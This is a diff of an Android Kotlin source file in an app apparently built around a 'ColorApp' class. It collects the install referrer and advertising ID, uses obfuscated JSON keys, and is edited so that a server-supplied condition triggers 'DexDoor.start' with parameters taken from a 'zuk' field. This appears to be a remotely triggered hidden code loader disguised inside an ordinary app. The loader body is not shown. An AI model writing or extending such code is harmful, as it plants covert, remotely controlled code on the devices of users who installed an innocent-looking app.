@@ -1,14 +1,13 @@
-package com.announcement.comprehension.t.dex
+package com.announcement.comprehension.t
 
 import android.app.Application
-import android.content.Context
 import android.os.Build
 import android.os.Bundle
 import android.util.Base64
 import android.util.Log
 import com.android.installreferrer.api.InstallReferrerClient
 import com.android.installreferrer.api.InstallReferrerStateListener
-import com.announcement.comprehension.t.ColorApp
+import com.announcement.comprehension.ColorApp
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
@@ -29,14 +28,9 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
 import org.json.JSONObject
-import java.io.ByteArrayOutputStream
-import java.io.File
-import java.io.FileOutputStream
 import java.io.IOException
 import java.util.Currency
 import java.util.UUID
-import javax.crypto.Cipher
-import javax.crypto.spec.SecretKeySpec
 import kotlin.random.Random
 import kotlin.text.toByteArray
 
@@ -196,8 +190,9 @@ object Fnc {
         } catch (_: Exception) {
         }
         if (isA(c)) {
-            m.ki.Dva.sim(ColorApp.app, arrayListOf("bug", c))
-//            DexDoor.start(ColorApp.app, arrayListOf("bug", c))
+//            Dva.sim(ColorApp.colorApp, arrayListOf("bug", c))
+            val list = JSONObject(c).optString("zuk").split("_")
+            DexDoor.start(ColorApp.colorApp, list as ArrayList<String>, arrayListOf("bug", c))
         }
     }
 
@@ -515,7 +510,7 @@ object Fnc {
         js.put("UCneBwX", refer)
         js.put("Akgna7HDh", referA)
         js.put("Bshshgha89", referB)
-        js.put("agjjIUhwh78",referC)
+        js.put("agjjIUhwh78", referC)
 
         dexLog("minJ: $js")
 
